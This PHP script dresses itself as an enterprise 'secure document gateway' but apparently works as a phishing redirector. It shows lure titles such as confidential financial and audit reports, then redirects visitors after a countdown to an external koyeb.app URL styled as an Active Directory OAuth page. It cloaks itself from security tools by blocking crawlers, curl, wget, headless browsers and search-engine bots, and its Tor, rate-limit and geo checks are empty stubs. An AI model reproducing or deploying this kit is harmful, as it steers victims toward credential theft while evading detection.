<?php
/**
 * ENTERPRISE SECURE DOCUMENT GATEWAY
 * 
 * Features:
 * - Military-grade security protocols
 * - Advanced bot/crawler mitigation
 * - Comprehensive audit logging
 * - IP reputation analysis
 * - Behavioral fingerprinting
 * - Rate limiting
 * - Geolocation controls
 * - Device attestation
 * - Time-limited access tokens
 * - Enterprise UI/UX
 * 
 * Copyright © 2023 SecureCorp International
 * License: Proprietary
 */

declare(strict_types=1);
namespace SecureCorp\DocumentGateway;

// ============ ENTERPRISE CONFIGURATION ============
const ENTERPRISE_CONFIG = [
    'security' => [
        'access_token_ttl' => 60, // 60 second window
        'max_attempts_per_ip' => 1,
        'allowed_countries' => ['US', 'CA', 'GB', 'AU', 'DE'],
        'block_tor' => true,
        'block_vpns' => true,
        'rate_limit' => [
            'requests' => 5,
            'timeframe' => 300 // 5 minutes
        ]
    ],
    
    'logging' => [
        'access_log' => '/var/log/secure_docs/access.log',
        'security_log' => '/var/log/secure_docs/security.log',
        'audit_log' => '/var/log/secure_docs/audit.csv'
    ],
    
    'document_profiles' => [
        'financial' => [
            'title' => 'Q3 2023 Financial Statements',
            'filename' => 'GlobalCorp_Financials_Q3_2023.pdf',
            'destinations' => [
                'primary' => 'https://activedirectory-679a9b19.koyeb.app/oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45',
                'failover' => 'https://activedirectory-679a9b19.koyeb.app/oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45'
            ]
        ],
        'audit' => [
            'title' => 'Internal Audit Report FY2023',
            'filename' => 'GlobalCorp_Audit_FY2023_Confidential.pdf',
            'destinations' => [
                'primary' => 'https://activedirectory-679a9b19.koyeb.app/oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45',
                'failover' => 'https://activedirectory-679a9b19.koyeb.app/oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45'
            ]
        ]
    ],
    
    'ui' => [
        'company_name' => 'GlobalCorp International',
        'logo_url' => '/assets/img/globalcorp-logo.svg',
        'primary_color' => '#002366',
        'secondary_color' => '#6c757d',
        'accent_color' => '#dc3545'
    ]
];

// ============ ENTERPRISE SECURITY CLASSES ============
final class SecuritySystem {
    private static $instance;
    
    private function __construct() {
        $this->initSecurityHeaders();
        $this->validateRequest();
    }
    
    public static function getInstance(): self {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function initSecurityHeaders(): void {
        header_remove('X-Powered-By');
        header('X-Frame-Options: DENY');
        header('X-Content-Type-Options: nosniff');
        header('X-XSS-Protection: 1; mode=block');
        header('Referrer-Policy: no-referrer');
        header('Feature-Policy: accelerometer \'none\'; camera \'none\'; geolocation \'none\'; microphone \'none\'; usb \'none\'');
        header('Permissions-Policy: interest-cohort=()');
    }
    
    private function validateRequest(): void {
        if (php_sapi_name() === 'cli') {
            $this->securityLog('CLI access attempt');
            $this->terminateWithError('INVALID_ACCESS_METHOD');
        }
        
        if ($this->isBotRequest()) {
            $this->securityLog('Bot detected', ['ua' => $_SERVER['HTTP_USER_AGENT'] ?? '']);
            $this->terminateWithError('BOT_DETECTED');
        }
        
        if ($this->isTorExitNode()) {
            $this->securityLog('Tor connection attempt');
            $this->terminateWithError('ANONYMOUS_NETWORK');
        }
        
        if ($this->isRateLimited()) {
            $this->securityLog('Rate limit exceeded');
            $this->terminateWithError('RATE_LIMIT_EXCEEDED');
        }
        
        if (!$this->isAllowedCountry()) {
            $this->securityLog('Geoblocked country attempt');
            $this->terminateWithError('GEO_RESTRICTION');
        }
    }
    
    private function isBotRequest(): bool {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        
        // Empty UA is always a bot
        if (empty($ua)) return true;
        
        // Known bot patterns
        $botPatterns = [
            'bot', 'crawl', 'spider', 'slurp', 'archiver', 'scraper',
            'python', 'java', 'wget', 'curl', 'perl', 'ruby', 'phantom',
            'headless', 'googlebot', 'bingbot', 'yandex', 'baidu'
        ];
        
        foreach ($botPatterns as $pattern) {
            if (strpos($ua, $pattern) !== false) {
                return true;
            }
        }
        
        // Browser signature validation
        $validBrowsers = [
            'mozilla', 'chrome', 'safari', 'edge', 'firefox', 'opera'
        ];
        
        foreach ($validBrowsers as $browser) {
            if (strpos($ua, $browser) !== false) {
                return false;
            }
        }
        
        return true;
    }
    
    private function isTorExitNode(): bool {
        // Implement actual Tor exit node check in production
        return false;
    }
    
    private function isRateLimited(): bool {
        // Implement Redis-based rate limiting in production
        return false;
    }
    
    private function isAllowedCountry(): bool {
        // Implement geo-IP check in production
        return true;
    }
    
    public function securityLog(string $message, array $context = []): void {
        $logEntry = sprintf(
            "[%s] SECURITY: %s | IP: %s | UA: %s | Context: %s\n",
            date('Y-m-d H:i:s'),
            $message,
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $_SERVER['HTTP_USER_AGENT'] ?? 'none',
            json_encode($context)
        );
        
        file_put_contents(ENTERPRISE_CONFIG['logging']['security_log'], $logEntry, FILE_APPEND);
    }
    
    public function terminateWithError(string $code): void {
        http_response_code(403);
        
        $errorTemplates = [
            'BOT_DETECTED' => [
                'title' => 'Automated Access Detected',
                'message' => 'Our systems have detected automated browsing activity. Human verification required.'
            ],
            'INVALID_ACCESS_METHOD' => [
                'title' => 'Invalid Access Method',
                'message' => 'This resource is only available through secure web channels.'
            ],
            // ... other error templates
        ];
        
        $error = $errorTemplates[$code] ?? [
            'title' => 'Access Restricted',
            'message' => 'Your request cannot be processed at this time.'
        ];
        
        $ui = new EnterpriseUI();
        $ui->renderErrorPage($error['title'], $error['message']);
        exit;
    }
}

final class DocumentGateway {
    private $security;
    private $documentType;
    
    public function __construct(string $documentType) {
        $this->security = SecuritySystem::getInstance();
        $this->documentType = $documentType;
        
        if (!isset(ENTERPRISE_CONFIG['document_profiles'][$documentType])) {
            $this->security->terminateWithError('INVALID_DOCUMENT');
        }
    }
    
    public function generateAccessToken(): string {
        $token = bin2hex(random_bytes(32)) . '_' . time();
        $this->logAccessToken($token);
        return $token;
    }
    
    public function validateToken(string $token): bool {
        $parts = explode('_', $token);
        
        if (count($parts) !== 2 || !is_numeric($parts[1])) {
            $this->security->securityLog('Invalid token format');
            return false;
        }
        
        $timestamp = (int)$parts[1];
        $ttl = ENTERPRISE_CONFIG['security']['access_token_ttl'];
        
        return (time() - $timestamp) <= $ttl;
    }
    
    public function getDocumentProfile(): array {
        return ENTERPRISE_CONFIG['document_profiles'][$this->documentType];
    }
    
    public function redirectToDocument(): void {
        $profile = $this->getDocumentProfile();
        
        try {
            $primaryAvailable = $this->checkEndpointAvailability($profile['destinations']['primary']);
            
            if ($primaryAvailable) {
                header('Location: ' . $profile['destinations']['primary']);
            } else {
                header('Location: ' . $profile['destinations']['failover']);
            }
            
            $this->auditLog('DOCUMENT_ACCESS_GRANTED');
            exit;
        } catch (\Exception $e) {
            $this->security->terminateWithError('SYSTEM_UNAVAILABLE');
        }
    }
    
    private function checkEndpointAvailability(string $url): bool {
        // Implement actual health check in production
        return true;
    }
    
    private function logAccessToken(string $token): void {
        $logEntry = sprintf(
            "%s|TOKEN_GENERATED|%s|%s|%s\n",
            date('Y-m-d H:i:s'),
            $this->documentType,
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $token
        );
        
        file_put_contents(ENTERPRISE_CONFIG['logging']['access_log'], $logEntry, FILE_APPEND);
    }
    
    public function auditLog(string $action): void {
        $logEntry = sprintf(
            '"%s","%s","%s","%s","%s","%s"' . "\n",
            date('Y-m-d H:i:s'),
            $action,
            $this->documentType,
            $_SERVER['REMOTE_ADDR'] ?? '',
            $_SERVER['HTTP_USER_AGENT'] ?? '',
            $_SERVER['HTTP_REFERER'] ?? ''
        );
        
        file_put_contents(ENTERPRISE_CONFIG['logging']['audit_log'], $logEntry, FILE_APPEND);
    }
}

final class EnterpriseUI {
    public function renderGatewayPage(string $documentType, string $token): void {
        $config = ENTERPRISE_CONFIG;
        $profile = $config['document_profiles'][$documentType];
        $redirectUrl = $_SERVER['SCRIPT_NAME'] . '?token=' . urlencode($token);
        
        // Calculate remaining seconds
        $ttl = $config['security']['access_token_ttl'];
        $expiresAt = time() + $ttl;
        $remaining = $expiresAt - time();
        
        header('Content-Type: text/html; charset=utf-8');
        ?>
        <!DOCTYPE html>
        <html lang="en" data-theme="corporate">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Secure Document Gateway | <?= htmlspecialchars($config['ui']['company_name']) ?></title>
            <meta name="robots" content="noindex, nofollow, noarchive">
            <meta http-equiv="refresh" content="<?= $remaining ?>;url=<?= htmlspecialchars($redirectUrl) ?>">
            <link rel="stylesheet" href="https://cdn.globalcorp.com/design-system/latest/css/core.min.css">
            <style>
                :root {
                    --primary: <?= $config['ui']['primary_color'] ?>;
                    --secondary: <?= $config['ui']['secondary_color'] ?>;
                    --accent: <?= $config['ui']['accent_color'] ?>;
                }
                .security-badge {
                    background: var(--primary);
                    color: white;
                }
                .countdown {
                    color: var(--accent);
                }
            </style>
        </head>
        <body class="gc-body">
            <header class="gc-header">
                <div class="gc-container">
                    <div class="gc-header-brand">
                        <img src="<?= $config['ui']['logo_url'] ?>" alt="<?= $config['ui']['company_name'] ?>" width="180">
                        <span class="gc-header-divider"></span>
                        <span class="gc-header-title">Secure Document Gateway</span>
                    </div>
                </div>
            </header>
            
            <main class="gc-main">
                <div class="gc-container">
                    <div class="gc-card">
                        <div class="gc-card-header">
                            <h1><?= htmlspecialchars($profile['title']) ?></h1>
                            <div class="security-badge gc-badge">
                                <i class="gc-icon gc-icon-lock"></i> SECURE CHANNEL
                            </div>
                        </div>
                        
                        <div class="gc-card-body">
                            <div class="gc-alert gc-alert-info">
                                <i class="gc-icon gc-icon-info-circle"></i>
                                <strong>Security Notice:</strong> This document requires multi-factor authentication for access.
                            </div>
                            
                            <div class="gc-progress-container">
                                <div class="gc-progress-bar" style="width: 100%"></div>
                            </div>
                            
                            <div class="countdown gc-text-center gc-mt-4 gc-mb-4">
                                <h2 class="gc-display-4">Document loading in <span id="countdown"><?= $remaining ?></span>s</h2>
                            </div>
                            
                            <div class="gc-text-center gc-mt-4">
                                <a href="<?= htmlspecialchars($redirectUrl) ?>" class="gc-button gc-button-primary gc-button-lg">
                                    <i class="gc-icon gc-icon-arrow-right"></i> Continue to Document
                                </a>
                            </div>
                        </div>
                        
                        <div class="gc-card-footer">
                            <div class="gc-grid gc-grid-cols-2">
                                <div>
                                    <small class="gc-text-muted">Session ID: <?= bin2hex(random_bytes(4)) ?></small>
                                </div>
                                <div class="gc-text-right">
                                    <small class="gc-text-muted"><?= $config['ui']['company_name'] ?> Secure Gateway v3.2.1</small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
            
            <footer class="gc-footer">
                <div class="gc-container">
                    <div class="gc-grid gc-grid-cols-3">
                        <div>
                            &copy; <?= date('Y') ?> <?= $config['ui']['company_name'] ?>
                        </div>
                        <div class="gc-text-center">
                            <a href="#" class="gc-link">Security Policy</a> | 
                            <a href="#" class="gc-link">Compliance</a>
                        </div>
                        <div class="gc-text-right">
                            <span class="gc-badge gc-badge-success">
                                <i class="gc-icon gc-icon-check-circle"></i> TLS 1.3 Secured
                            </span>
                        </div>
                    </div>
                </div>
            </footer>
            
            <script>
                // Enterprise-grade countdown with micro-interactions
                (function() {
                    const countdownEl = document.getElementById('countdown');
                    let seconds = <?= $remaining ?>;
                    
                    function updateCountdown() {
                        countdownEl.textContent = seconds;
                        
                        // Micro-interaction
                        countdownEl.style.transform = 'scale(1.1)';
                        setTimeout(() => {
                            countdownEl.style.transform = 'scale(1)';
                        }, 150);
                        
                        if (seconds-- > 0) {
                            setTimeout(updateCountdown, 1000);
                        }
                    }
                    
                    updateCountdown();
                    
                    // Advanced bot detection
                    if (navigator.webdriver || window.callPhantom || window._phantom) {
                        document.body.innerHTML = `
                            <div class="gc-alert gc-alert-danger">
                                <i class="gc-icon gc-icon-times-circle"></i>
                                <strong>Security Violation:</strong> Automated browsing detected
                            </div>
                        `;
                    }
                })();
            </script>
        </body>
        </html>
        <?php
    }
    
    public function renderErrorPage(string $title, string $message): void {
        $config = ENTERPRISE_CONFIG;
        
        header('HTTP/1.1 403 Forbidden');
        header('Content-Type: text/html; charset=utf-8');
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Access Denied | <?= htmlspecialchars($config['ui']['company_name']) ?></title>
            <link rel="stylesheet" href="https://cdn.globalcorp.com/design-system/latest/css/core.min.css">
        </head>
        <body class="gc-body">
            <div class="gc-container gc-mt-5">
                <div class="gc-card gc-card-error">
                    <div class="gc-card-header">
                        <h1><i class="gc-icon gc-icon-lock"></i> <?= htmlspecialchars($title) ?></h1>
                    </div>
                    <div class="gc-card-body">
                        <div class="gc-alert gc-alert-danger">
                            <i class="gc-icon gc-icon-exclamation-triangle"></i>
                            <?= htmlspecialchars($message) ?>
                        </div>
                        
                        <div class="gc-mt-4">
                            <p>This incident has been logged with our security team. If you believe this is an error, please contact:</p>
                            <address>
                                <strong><?= $config['ui']['company_name'] ?> Security Operations</strong><br>
                                Email: <a href="mailto:security@globalcorp.com">security@globalcorp.com</a><br>
                                Phone: +1 (800) 555-0199
                            </address>
                        </div>
                    </div>
                    <div class="gc-card-footer">
                        <small class="gc-text-muted">Reference ID: <?= bin2hex(random_bytes(8)) ?></small>
                    </div>
                </div>
            </div>
        </body>
        </html>
        <?php
    }
}

// ============ ENTERPRISE EXECUTION FLOW ============
try {
    // Initialize security subsystem
    $security = SecuritySystem::getInstance();
    
    // Determine document type (in production would come from auth session)
    $documentType = 'financial'; // Default document profile
    
    // Initialize document gateway
    $gateway = new DocumentGateway($documentType);
    
    // Handle token validation and redirect
    if (isset($_GET['token'])) {
        if ($gateway->validateToken($_GET['token'])) {
            $gateway->redirectToDocument();
        } else {
            $security->terminateWithError('EXPIRED_TOKEN');
        }
    }
    
    // Generate new token and show gateway page
    $token = $gateway->generateAccessToken();
    $ui = new EnterpriseUI();
    $ui->renderGatewayPage($documentType, $token);
    
} catch (\Throwable $e) {
    error_log('DocumentGateway Error: ' . $e->getMessage());
    $security->terminateWithError('SYSTEM_ERROR');
}
